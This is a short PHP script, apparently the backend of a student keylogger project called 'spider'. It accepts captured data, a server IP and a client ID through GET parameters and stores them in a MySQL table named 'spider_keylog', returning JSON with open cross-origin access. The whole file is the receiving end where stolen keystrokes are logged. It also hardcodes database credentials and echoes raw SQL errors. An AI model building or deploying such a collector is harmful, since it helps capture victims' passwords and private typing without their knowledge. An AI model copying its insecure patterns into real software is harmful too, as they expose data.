<?php

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

$server = mysql_real_escape_string($_GET['server']);
$data = mysql_real_escape_string($_GET['data']);
$client = mysql_real_escape_string($_GET['client']);
$date = time();

$db = mysql_connect('mysql1.alwaysdata.com', '106149_nibbler', 'password');
mysql_select_db('epitech-hub_nibbler', $db);
$sql = "INSERT INTO `epitech-hub_nibbler`.`spider_keylog` (`id`, `server_ip`, `data`, `client_id`, `date`) VALUES ( NULL, '" . $server . "','" . $data . "','" . $client . "','" . $date . "')";
$req = mysql_query($sql) or die ('SQL Error : <br>'. $sql . '<br>' . mysql_error());
$final['status'] = true;
$final['date'] = time();
echo json_encode($final);
mysql_close();
?>